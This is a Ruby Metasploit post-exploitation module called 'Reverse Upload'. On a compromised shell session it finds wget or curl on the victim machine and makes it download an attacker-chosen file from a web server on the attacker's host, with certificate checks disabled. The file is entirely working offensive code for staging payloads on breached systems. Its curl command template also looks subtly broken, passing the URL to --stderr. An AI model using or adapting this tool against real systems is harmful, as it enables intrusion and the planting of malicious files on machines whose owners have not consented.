##
# Advanced Post Exploitation
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'core/post/staekka'
require 'core/post/staekka/file'
require 'core/post/unix/commands'

require 'msf/core/exploit/http/server'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Staekka
  include Msf::Post::Unix::Commands
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
                      'Name'          => 'Reverse Upload',
                      'Description'   => %q{(fast) uploading files using a local web server},
                      'Author'        => [ 'jot'],
                      'SessionTypes'  => [ 'shell' ]))
    register_options(
      [
        OptPath.new('LFILE',  [ true, 'Local file to upload']),
        OptString.new('RFILE',  [ true, 'Where to save the uploaded file']),
        OptString.new('SRVHOST',  [ true, 'The local host to listen on. This must be an address on the local machine' ]),
        OptString.new('SRVPORT',  [ true, 'The local port'])
      ], self.class
    )
  end

  def run
    cmd = find_download_tool
    if cmd.nil?
      raise "Cannot find a tool for downloading files"
    else
      cmd = cmd + '  >' + datastore['RFILE']
    end
    data = ::File.read(datastore['LFILE'])
    if data.nil? || data.empty?
      raise "Cannot read #{datastore['LFILE']}"
    else
      @htdoc = data
    end
    path = random_uri
    start_webserver(path, cmd)
  end

  def find_download_tool
    if session.methods.include? :cache
      if session.cache.exists?("download_cmd")
        command = session.cache.read("download_cmd")
        vprint_status("already found a command for : #{command}")
        return command
      end
    end

    download_tools = {
      'wget' =>	%q(wget --no-check-certificate -q -O - '__URL__' ),
      'curl' =>	%q(curl -k -f --stderr '__URL__' )
    }
    download_tools.each_pair do |tool, cmd|
      next unless installed? tool
      if can_download?(cmd)
        return cmd
      end
    end
    nil
  end

  def can_download?(cmd)
    test_token = ::Rex::Text.rand_text_alpha(12)
    @htdoc = test_token
    path = random_uri
    dowloaded = start_webserver(path, cmd)
    if dowloaded == test_token
      session.cache.add("download_cmd", cmd) if session.methods.include? :cache
      true
    else
      false
    end
  end

  def on_request_uri(cli, req)
    data = @htdoc
    vprint_status("on_request_uri called: #{req.inspect}")
    send_response(cli, data)
    @request_done = true
  end

  def start_webserver(path, cmd)
    server_host = datastore['SRVHOST']
    server_port = datastore['SRVPORT'].to_s
    if datastore['SSL'] == true
      scheme = 'https://'
    else
      scheme = 'http://'
    end
    download_url = scheme + server_host + ':' + server_port + path
    cmd = cmd.gsub('__URL__', download_url)
    @request_done = false
    start_service('Uri' => {
                    'Proc' => proc do |cli, req|
                      on_request_uri(cli, req)
                    end,
                    'Path' => path
                  })
    tmp = cmd_exec(cmd)
    # vprint_debug("Downloaded: |#{tmp}|")
    tmp
  end
end
